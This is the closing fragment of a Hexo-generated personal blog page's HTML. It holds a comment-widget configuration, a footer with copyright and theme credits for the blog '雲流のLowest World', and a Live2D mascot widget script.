        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2026 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>